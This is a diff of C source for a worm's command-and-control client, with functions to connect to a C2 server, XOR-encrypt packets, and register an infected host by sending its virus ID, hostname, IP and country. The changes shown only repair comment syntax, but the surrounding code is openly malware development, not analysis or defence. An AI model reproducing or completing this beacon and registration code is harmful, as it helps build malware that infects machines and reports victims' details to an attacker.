@@ -82,7 +82,8 @@ SOCKET connect_to_c2(char *hostname, int port){
 /* Function: Send a Constructed Message to the C2 server and receive the response data 
 *  Input: Encrypted Packet Buffer
 *  Output: Response Packet
-/* 
+*/
+		       
 char *send_to_c2(char *encrypted_data){
 	char recvbuf[DEFAULT_BUFLEN];
 	int iResult;
@@ -122,7 +123,7 @@ char *send_to_c2(char *encrypted_data){
 /* Function: Encrypts a Data packet from plaintext buffer 
 *  Input: Encrypted Packet Buffer
 *  Output: Response Packet
-/*
+*/
 
 char *encryption(char *decrypted_data){
 	int i;
@@ -142,7 +143,8 @@ char *encryption(char *decrypted_data){
 /* Function: Decrypts a Data packet 
 *  Input: Encrypted Packet Buffer
 *  Output: Decrypted Packet
-/*
+*/
+		       
 char *decryption(char *encrypted_data){
 	int i;
 	char decrypted_data[DEFAULT_BUFLEN];
@@ -161,7 +163,7 @@ char *decryption(char *encrypted_data){
 /* Function: Takes variable length inputs and ensures that the init packet is the correct format (See Google Drive for specific details) 
 *  Input: Variables to be inserted into the server database
 *  Output: A single combined packet in the correct format
-/*
+*/
 
 char *structure_init_message(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
 	char buffer[32];
@@ -197,7 +199,7 @@ char *structure_init_message(char XOR_key, char *virus_id, char *hostname, char 
 /* Function: Main Driver function for the first contact with server, utlizies previously defined functions 
 *  Input: Variables to be sent to the database
 *  Output: Server verification
-/*
+*/
 
 int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
 	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
